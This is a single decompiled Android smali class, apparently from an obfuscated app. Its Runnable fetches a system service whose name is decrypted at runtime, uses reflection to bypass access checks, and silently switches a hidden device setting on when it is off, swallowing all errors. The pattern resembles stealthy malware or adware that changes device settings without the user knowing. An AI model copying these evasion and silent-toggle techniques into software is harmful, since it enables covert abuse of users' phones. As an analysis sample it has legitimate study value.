.class Ldenp/zsexnmjp/jlpuazhsotnr/j;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Ldenp/zsexnmjp/jlpuazhsotnr/Cdbcea;


# direct methods
.method constructor <init>(Ldenp/zsexnmjp/jlpuazhsotnr/Cdbcea;)V
    .locals 0

    .prologue
    .line 495
    iput-object p1, p0, Ldenp/zsexnmjp/jlpuazhsotnr/j;->a:Ldenp/zsexnmjp/jlpuazhsotnr/Cdbcea;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    .prologue
    .line 499
    :try_start_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-ge v0, v1, :cond_0

    .line 500
    const/4 v0, 0x0

    invoke-static {v0}, Ldenp/zsexnmjp/jlpuazhsotnr/g;->a(Z)V

    .line 501
    sget-object v0, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v2, 0x2

    invoke-virtual {v0, v2, v3}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    .line 502
    const/4 v0, 0x1

    invoke-static {v0}, Ldenp/zsexnmjp/jlpuazhsotnr/g;->a(Z)V

    .line 503
    sget-object v0, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v2, 0x5

    invoke-virtual {v0, v2, v3}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    .line 508
    :cond_0
    :goto_0
    :try_start_1
    iget-object v0, p0, Ldenp/zsexnmjp/jlpuazhsotnr/j;->a:Ldenp/zsexnmjp/jlpuazhsotnr/Cdbcea;

    const v1, 0x100156

    invoke-static {v1}, Ldenp/zsexnmjp/jlpuazhsotnr/k;->a(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ldenp/zsexnmjp/jlpuazhsotnr/Cdbcea;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    .line 509
    const v0, 0xcce4c

    invoke-static {v0}, Ldenp/zsexnmjp/jlpuazhsotnr/g;->b(I)Ljava/lang/Class;

    move-result-object v0

    const v2, 0x1000a5

    invoke-static {v2}, Ldenp/zsexnmjp/jlpuazhsotnr/k;->a(I)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    new-array v3, v3, [Ljava/lang/Class;

    invoke-virtual {v0, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 510
    sget-object v2, Ldenp/zsexnmjp/jlpuazhsotnr/k;->p:Ljava/lang/reflect/Method;

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    aput-object v5, v3, v4

    invoke-virtual {v2, v0, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 511
    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Object;

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_1

    .line 512
    const v0, 0xcce4c

    invoke-static {v0}, Ldenp/zsexnmjp/jlpuazhsotnr/g;->b(I)Ljava/lang/Class;

    move-result-object v0

    const v2, 0x1000a6

    invoke-static {v2}, Ldenp/zsexnmjp/jlpuazhsotnr/k;->a(I)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Class;

    const/4 v4, 0x0

    sget-object v5, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v5, v3, v4

    invoke-virtual {v0, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 513
    sget-object v2, Ldenp/zsexnmjp/jlpuazhsotnr/k;->p:Ljava/lang/reflect/Method;

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    aput-object v5, v3, v4

    invoke-virtual {v2, v0, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 514
    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 516
    :cond_1
    const/4 v0, 0x0

    sput-boolean v0, Ldenp/zsexnmjp/jlpuazhsotnr/a;->a:Z
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    .line 519
    :goto_1
    return-void

    .line 517
    :catch_0
    move-exception v0

    goto :goto_1

    .line 505
    :catch_1
    move-exception v0

    goto :goto_0
.end method
